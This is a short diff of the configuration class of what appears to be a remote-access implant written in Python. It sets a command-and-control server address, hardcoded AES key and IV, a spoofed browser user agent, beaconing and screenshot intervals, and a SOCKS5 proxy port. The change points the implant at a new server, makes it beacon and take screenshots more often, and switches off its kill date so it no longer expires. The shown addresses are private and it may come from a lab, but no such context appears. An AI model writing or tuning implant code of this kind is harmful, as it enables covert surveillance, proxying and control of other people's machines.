@@ -99,18 +99,18 @@ except ImportError as e:
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://192.168.147.1"
+        self.C2_SERVER = "https://10.10.8.3"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        self.CHECKIN_INTERVAL = 17
+        self.CHECKIN_INTERVAL = 10
         self.SOCKS5_PORT = 1080
         self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
         self.DEBUG = True
         self.TAKE_SCREENSHOTS = True
-        self.SCREENSHOT_FREQUENCY = 30
-        self.KILLDATE_ENABLED = True
-        self.KILLDATE = "2025-05-16 09:30" if True else ""
+        self.SCREENSHOT_FREQUENCY = 10
+        self.KILLDATE_ENABLED = False
+        self.KILLDATE = "" if False else ""
 
 # ======================
 # Encryption
